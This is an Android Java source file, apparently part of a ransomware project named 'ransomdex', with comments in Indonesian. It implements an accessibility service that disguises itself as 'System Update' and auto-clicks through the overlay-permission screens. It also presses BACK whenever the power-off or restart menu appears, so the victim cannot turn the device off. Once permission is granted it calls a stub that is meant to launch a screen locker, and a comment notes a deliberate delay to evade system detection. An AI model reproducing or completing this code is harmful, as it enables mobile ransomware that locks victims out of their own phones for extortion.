package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 800; // Delay agar tidak terdeteksi sistem sebagai spam

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        // Konfigurasi dinamis agar service lebih responsif
        AccessibilityServiceInfo info = getServiceInfo();
        info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS; 
        info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // 1. ANTISIPASI: Cegah User mematikan Service atau membuka Menu Power
            if (packageName.equals("android") || packageName.contains("systemui")) {
                checkAndDismissSensitiveUI(rootNode);
            }

            // 2. LOGIKA JUMP: Jika belum punya izin Overlay, paksa ke menu Settings
            if (!Settings.canDrawOverlays(this)) {
                handleOverlayPermissionFlow(rootNode, packageName);
            } else {
                // Jika sudah dapat izin, jalankan payload utama (Locker)
                triggerLocker();
            }

        } finally {
            // CRITICAL: Selalu recycle rootNode untuk mencegah Memory Leak/Crash
            rootNode.recycle();
        }
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        long now = System.currentTimeMillis();
        if (now - lastActionTime < ACTION_DELAY) return;

        // A. Jika di luar Settings, lompat ke halaman izin
        if (!pkg.contains("settings")) {
            jumpToOverlaySettings();
            return;
        }

        // B. Klik otomatis berdasarkan ID (Lebih stabil dari Teks)
        // Gunakan ID standar Android untuk Switch/Toggle
        clickById(root, "android:id/switch_widget");
        clickById(root, "android:id/button1"); // Tombol "OK" atau "Allow"

        // C. Fallback: Cari nama aplikasi kita di list jika belum masuk ke detail
        clickByText(root, "System Update"); 
    }

    private void clickById(AccessibilityNodeInfo node, String viewId) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByViewId(viewId);
        for (AccessibilityNodeInfo target : targets) {
            if (target.isEnabled()) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            // Validasi teks persis untuk menghindari salah klik
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            AccessibilityNodeInfo parent = clickable.getParent();
            // Jangan recycle 'clickable' di sini karena kita butuh parent-nya
            clickable = parent;
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        // Otomatis menekan BACK jika user mencoba membuka Power Menu (Mati Daya/Restart)
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(intent);
    }

    private void triggerLocker() {
        // Panggil LockerService di sini
    }

    @Override
    public void onInterrupt() {}
}